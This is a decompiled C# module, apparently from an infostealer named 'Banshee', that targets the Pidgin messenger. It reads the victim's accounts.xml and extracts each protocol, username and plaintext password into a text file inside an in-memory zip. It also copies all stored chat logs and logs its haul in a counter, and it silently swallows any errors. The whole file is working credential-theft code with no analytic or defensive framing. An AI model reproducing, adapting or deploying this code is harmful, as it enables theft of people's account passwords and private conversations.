﻿using System;
using System.IO;
using System.Text;
using System.Xml;
using Banshee.Helper.Data;

namespace Banshee.Targets.Messangers
{
	// Token: 0x02000044 RID: 68
	public class Pidgin : ITarget
	{
		// Token: 0x06000099 RID: 153 RVA: 0x000052D8 File Offset: 0x000052D8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple");
			if (Directory.Exists(text))
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Pidgin";
				this.CollectAccounts(zip, text, counterApplications);
				this.CollectLogs(zip, text, counterApplications);
				if (counterApplications.Files.Count > 0)
				{
					counterApplications.Files.Add("Pidgin\\");
					counter.Messangers.Add(counterApplications);
				}
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x0000534C File Offset: 0x0000534C
		private void CollectLogs(InMemoryZip zip, string pidginRoot, Counter.CounterApplications counterApplications)
		{
			try
			{
				string text = Path.Combine(pidginRoot, "logs");
				if (Directory.Exists(text))
				{
					string text2 = Path.Combine("Pidgin", "chatlogs");
					zip.AddDirectoryFiles(text, ZipPath.Messengers(text2), true);
					counterApplications.Files.Add(text + " => " + text2);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x000053B8 File Offset: 0x000053B8
		private void CollectAccounts(InMemoryZip zip, string pidginRoot, Counter.CounterApplications counterApplications)
		{
			try
			{
				string text = Path.Combine(pidginRoot, "accounts.xml");
				if (File.Exists(text))
				{
					StringBuilder stringBuilder = new StringBuilder();
					XmlDocument xmlDocument = new XmlDocument();
					using (XmlReader xmlReader = XmlReader.Create(text, new XmlReaderSettings
					{
						IgnoreComments = true,
						IgnoreWhitespace = true
					}))
					{
						xmlDocument.Load(xmlReader);
					}
					XmlElement documentElement = xmlDocument.DocumentElement;
					if (documentElement != null)
					{
						foreach (object obj in documentElement.ChildNodes)
						{
							XmlNode xmlNode = (XmlNode)obj;
							if (xmlNode.ChildNodes.Count >= 3)
							{
								XmlNode xmlNode2 = xmlNode.ChildNodes[0];
								XmlNode xmlNode3 = xmlNode.ChildNodes[1];
								XmlNode xmlNode4 = xmlNode.ChildNodes[2];
								string text2 = (xmlNode2 != null) ? xmlNode2.InnerText : null;
								string text3 = (xmlNode3 != null) ? xmlNode3.InnerText : null;
								string text4 = (xmlNode4 != null) ? xmlNode4.InnerText : null;
								if (!string.IsNullOrEmpty(text2) && !string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4))
								{
									stringBuilder.AppendLine("Protocol: " + text2);
									stringBuilder.AppendLine("Username: " + text3);
									stringBuilder.AppendLine("Password: " + text4);
									stringBuilder.AppendLine();
								}
							}
						}
						if (stringBuilder.Length != 0)
						{
							string text5 = Path.Combine("Pidgin", "accounts.txt");
							zip.AddTextFile(ZipPath.Messengers(text5), stringBuilder.ToString());
							counterApplications.Files.Add(text + " => " + text5);
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
